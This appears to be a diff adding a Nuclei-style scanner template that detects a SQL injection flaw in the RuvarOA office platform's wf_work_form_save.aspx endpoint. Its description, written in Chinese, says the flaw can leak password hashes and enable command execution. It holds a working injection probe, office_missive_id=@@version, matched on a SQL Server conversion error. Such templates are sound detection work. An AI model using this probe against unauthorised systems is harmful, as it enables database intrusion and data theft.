@@ -1,0 +1,30 @@
+id: RuvarOA-sql
+info:
+  name: "RuvarOA协同办公平台 wf_work_form_save.aspx 存在 SQL 注入漏洞"
+  author: Unknown
+  severity: high
+  description: RuvarOA协同办公平台的 wf_work_form_save.aspx 接口存在SQL注入漏洞。攻击者可通过构造恶意输入实现数据库敏感信息提取，包括管理员后台密码哈希值及用户隐私数据。在特定权限条件下，该漏洞可能被利用执行任意操作系统命令或部署远程代码执行载荷，导致服务器控制权被完全接管。
+  tags: RuvarOA
+
+http:
+- raw:
+  - |
+    GET /WorkFlow/wf_work_form_save.aspx?office_missive_id=@@version HTTP/1.1
+    Host: {{Hostname}}
+
+
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '转换成数据类型 int 时失败'
+  - type: status
+    status:
+    - 500
+
+
+
+
+
